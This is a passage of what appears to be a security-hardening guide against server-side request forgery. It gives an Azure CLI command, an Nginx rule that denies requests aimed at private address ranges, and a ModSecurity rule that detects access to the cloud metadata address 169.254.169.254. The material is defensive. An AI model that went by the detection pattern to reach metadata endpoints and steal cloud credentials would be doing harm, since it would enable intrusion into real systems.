az vm update --resource-group myResourceGroup --name myVM --set networkProfile.networkInterfaces[0].properties.ipConfigurations[0].properties.privateIPAllocationMethod=Dynamic
```

### Web Server Configuration

```nginx
# Nginx: Block internal requests
location ~ ^/(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|169\.254\.) {
    deny all;
}
```

### WAF Rules

```# ModSecurity rule for SSRF
SecRule ARGS "@rx 169\.254\.169\.254" \
    "id:1001,phase:1,deny,status:403,msg:'SSRF Metadata Access Detected'"
```
